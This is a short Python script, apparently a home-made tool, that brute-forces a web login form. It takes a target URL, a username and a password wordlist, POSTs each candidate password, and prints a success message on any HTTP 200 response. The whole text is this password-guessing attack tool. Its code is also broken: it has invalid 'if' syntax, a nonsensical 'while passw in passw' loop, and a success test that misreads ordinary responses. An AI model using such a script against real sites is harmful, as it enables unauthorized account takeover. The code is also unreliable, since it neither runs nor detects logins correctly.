import requests 

url = input("What is the web-address of the login form: ")
uname = input("What is the username: ")
uname_field = input("What is the name of username field: ")
pass_field = input("What is the name of password field: ")
wordlist = input("What is the location of the wordlist: ")

if uname_field = "":
    uname_field = "username"

if pass_field = "":
     pass_field = "password"


passw = open(str(wordlist),"r")
while passw in passw:
    payload = {

        uname_field: uname,
        pass_field: passw
    }

    r = requests.post(url, data=payload)
    if r.status_code == 200:
        print(str(uname)+":"+str(passw)+" was successful!")
